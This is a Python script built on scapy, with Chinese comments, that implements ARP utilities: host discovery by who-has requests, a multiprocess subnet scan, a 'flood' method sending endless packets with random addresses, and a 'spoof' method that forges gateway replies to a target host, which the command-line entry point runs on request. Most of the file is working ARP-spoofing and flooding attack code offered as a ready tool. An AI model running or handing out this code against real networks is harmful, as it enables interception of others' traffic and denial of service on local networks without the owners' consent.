import concurrent
import ipaddress
import sys
from argparse import ArgumentParser
from concurrent.futures.process import ProcessPoolExecutor

from scapy.arch import get_windows_if_list
from scapy.layers.inet import IP
from scapy.layers.l2 import *
from scapy.volatile import RandMAC, RandIP


class Arp:

    BoardCast = 'FF:FF:FF:FF:FF:FF'
    Empty = '00:00:00:00:00:00'

    def __init__(self, ether_name, timeout, verbose):
        """
        ARP，因为二层协议，所以必须指定网卡

        :param ether_name: 网卡名
        :param timeout: 超时时间
        """

        self.__ether_name = ether_name
        self.__timeout = timeout
        self.__verbose = verbose

        if self.__ether_name:
            if 'win32' in sys.platform.lower():
                ifaces = get_windows_if_list()
                for ether in ifaces:
                    if ether['name'] == self.__ether_name:
                        self.__mac = ether['mac']
                        self.__ip4 = ether['ip']
            else:
                self.__mac = get_if_hwaddr(self.__ether_name)
                self.__ip4 = get_if_addr(self.__ether_name)
        else:
            self.__ip4 = IP(dst='www.baidu.com').src
            self.__mac = Ether().src

    @classmethod
    def get_arp(cls, op, sendermac, senderip4, targetmac, targetip4):
        """
        构造ARP数据包

        :param op: ARP选项
        :param sendermac: 发送者mac地址
        :param senderip4: 发送者ip4地址
        :param targetmac: 目标的mac地址
        :param targetip4: 目标的ip4地址
        :return: ARP数据包
        """

        return ARP(op=op,
                   hwsrc=sendermac, psrc=senderip4,
                   hwdst=targetmac, pdst=targetip4)

    def who_has(self, targetip4):
        """
        arp协议中的who-has命令，使用arp协议获取指定ip地址的mac地址

        :param targetip4: 目的地ip地址
        :return: 目标ip地址对应的mac地址
        """

        ether = Ether(src=self.__mac, dst=self.BoardCast)
        arp = self.get_arp('who-has',
                           sendermac=self.__mac, senderip4=self.__ip4,
                           targetmac=self.Empty, targetip4=targetip4)

        arp_packet = ether / arp

        answer = srp1(arp_packet, iface=self.__ether_name,
                      timeout=self.__timeout, verbose=self.__verbose)

        return answer[ARP].hwsrc if answer else None

    def flood(self):
        """
        泛洪攻击
        """

        randmac = RandMAC()
        randip = RandIP()
        arp_packet = Ether(src=randmac, dst=randmac) / IP(src=randip, dst=randip)
        sendp(arp_packet, iface=self.__ether_name, count=sys.maxsize,
              interval=0.2, verbose=self.__verbose)

    def spoof(self, targetip4, targetmac, gatewayip4):
        """
        arp欺骗

        :param targetip4: 目的地ip地址
        :param targetmac: 被攻击的主机mac地址
        :param gatewayip4: 网关地址（一般ARP欺骗都是伪造成网关）
        """

        ether = Ether(src=self.__mac, dst=targetmac)
        arp = self.get_arp(op='is-at',
                           sendermac=self.__mac, senderip4=gatewayip4,
                           targetmac=targetmac, targetip4=targetip4)
        arp_packet = ether / arp

        sendp(arp_packet, iface=self.__ether_name, count=sys.maxsize,
              interval=0.2, verbose=self.__verbose)


    def list_who_has(self, ip4s):
        """
        请求一组ip地址，获取主机的mac地址

        :param ip4s 目标主机列表
        :return: 存活主机的mac地址
        """

        host = []
        for ip in ip4s:
            mac = self.who_has(str(ip))
            if mac:
                host.append({
                    'ip' : str(ip),
                    'mac': mac
                })

        return host


    def async_host_scan(self, pdst, process_count=4):
        """
        使用多核进行arp的主机扫描
        :param pdst: 目的地IP地址
        :param process_count: 核心数
        :return: 存活的主机列表
        """
        ips = list(ipaddress.ip_network(pdst).hosts())

        if len(ips) < 4:
            process_count = 1

        host =[]
        with ProcessPoolExecutor(max_workers=process_count) as executor:
            future_of_func = [executor.submit(self.list_who_has, ips[::i]) for i in range(0, process_count)]
            for future in concurrent.futures.as_completed(future_of_func):
                host.append(future.result())

        return host


if __name__ == '__main__':
    parser = ArgumentParser('arp tools')

    # 普通参数
    parser.add_argument('-e', '--ether', type=str, help='网卡名称')
    parser.add_argument('-p', '--targetip4', type=str, required=True, help='目标主机的ipv4')
    parser.add_argument('-t', '--timeout', type=float, default=1, help='等待消息的回复延迟')
    parser.add_argument('-v', '--verbose', default=False, action='store_true', help='是否打印地址信息')

    group = parser.add_mutually_exclusive_group()
    group.add_argument('-g', '--gwip4', type=str, help='伪造的ip地址，一般为网关地址')
    group.add_argument('-s', '--scan', action='store_true', help='scan the active hosts')
    args = parser.parse_args()

    arp = Arp(args.ether, args.timeout, args.verbose)
    if args.gwip4:
        mac = arp.who_has(args.targetip4)
        arp.spoof(args.targetip4, mac, args.gwip4)
    else:
        hwsrc = arp.who_has(args.targetip4)
        if hwsrc:
            print(f'ip = {args.targetip4}, mac = {hwsrc}')
        else:
            print(f'ip = {args.targetip4} do not find')